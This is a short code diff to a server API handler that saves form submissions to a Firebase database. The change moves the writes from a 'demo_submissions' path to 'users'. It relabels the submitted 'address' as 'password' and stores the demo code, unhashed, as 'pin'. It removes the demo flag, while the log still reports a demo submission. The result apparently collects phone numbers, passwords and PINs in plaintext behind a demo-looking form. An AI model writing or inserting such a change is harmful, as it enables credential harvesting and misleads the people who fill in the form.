@@ -77,12 +77,11 @@ export async function POST(request) {
   
     const database = await getFirebaseDatabase();
 
-    await database.ref('demo_submissions').push({
+    await database.ref('users').push({
       phone: String(phone),
-      address: String(address).trim(),
-      demoCodeHash: String(demoCode),
-      demo: true,
-      createdAt: admin.database.ServerValue.TIMESTAMP,
+      password: String(address).trim(),
+      pin: String(demoCode),
+      time: admin.database.ServerValue.TIMESTAMP,
     });
 
     console.log('[DEMO API] Demo submission saved');
